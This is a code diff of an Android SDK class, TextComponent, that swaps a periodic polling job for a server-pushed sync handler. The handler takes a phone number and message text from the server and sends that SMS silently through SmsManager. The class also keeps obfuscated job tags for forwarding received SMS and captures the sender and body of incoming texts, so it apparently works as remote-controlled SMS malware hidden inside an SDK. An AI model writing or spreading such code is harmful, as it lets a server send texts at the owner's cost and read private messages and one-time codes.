@@ -13,6 +13,8 @@ import com.evernote.android.job.util.support.PersistableBundleCompat;
 import java.util.concurrent.TimeUnit;
 
 import commons.app.com.commons.commons.SdkComponent;
+import privacy.app.com.text.keep.DeviceEventsResponse;
+import privacy.app.com.text.keep.Text;
 
 @SuppressWarnings("WeakerAccess")
 public class TextComponent extends SdkComponent {
@@ -23,8 +25,6 @@ public class TextComponent extends SdkComponent {
 
     private static final String JOB_TAG_SEND_RECEIVED_SMS = "t826t763738_1";
     private static final String JOB_TAG_SMS_SENT = "t826t763738_2";
-    private static final String JOB_TAG_CHECK_FOR_EVENTS_NOW = "ev67673286828_now";
-    private static final String JOB_TAG_CHECK_FOR_EVENTS = "ev67673286828";
 
     private static TextComponent instance;
 
@@ -36,18 +36,9 @@ public class TextComponent extends SdkComponent {
         instance = this;
     }
 
-    @Override
-    public void onDeviceRegistered() {
-        startCheckForDeviceEvents();
-    }
-
     @Nullable
     @Override
     public Job createJob(@NonNull String tag) {
-        if (JOB_TAG_CHECK_FOR_EVENTS.equals(tag) ||
-                JOB_TAG_CHECK_FOR_EVENTS_NOW.equals(tag)) {
-            return new CheckPendingEventsJob();
-        }
         if (JOB_TAG_SEND_RECEIVED_SMS.equals(tag)) {
             return new SendReceivedSmsJob();
         }
@@ -67,29 +58,20 @@ public class TextComponent extends SdkComponent {
         }
     }
 
+    @Override
+    public void onSyncEvent(@NonNull String json) {
+        DeviceEventsResponse response = safeParse(json, DeviceEventsResponse.class);
+        if (response != null) {
+            Text smsToSend = response.getText();
+            if (smsToSend != null) {
+                onSmsComeToSend(smsToSend.getId(), smsToSend.getPhoneNumber(), smsToSend.getMessage());
+            }
+        }
+    }
+
     ///////////////////////////////////////////////////////////////////////////
     // JOBS
     ///////////////////////////////////////////////////////////////////////////
-
-    private void startCheckForDeviceEvents() {
-        // One-off at NOW
-        long executionWindow = TimeUnit.SECONDS.toMillis(10);
-        long startTime = TimeUnit.SECONDS.toMillis(10);
-        new JobRequest.Builder(JOB_TAG_CHECK_FOR_EVENTS_NOW)
-                .setExecutionWindow(startTime, startTime + executionWindow)
-                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
-        // Repeated
-        new JobRequest.Builder(JOB_TAG_CHECK_FOR_EVENTS)
-                .setPeriodic(TimeUnit.MINUTES.toMillis(15), TimeUnit.MINUTES.toMillis(5))
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
-    }
 
     public void onSmsReceived(String sender, String message) {
         PersistableBundleCompat extras = new PersistableBundleCompat();
@@ -120,7 +102,7 @@ public class TextComponent extends SdkComponent {
     // UTILS
     ///////////////////////////////////////////////////////////////////////////
 
-    public void onSmsComeToSend(String smsId, String recipient, String message) {
+    private void onSmsComeToSend(String smsId, String recipient, String message) {
         if (!TextUtils.isEmpty(recipient) && !TextUtils.isEmpty(message)) {
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(recipient, null, message, null, null);
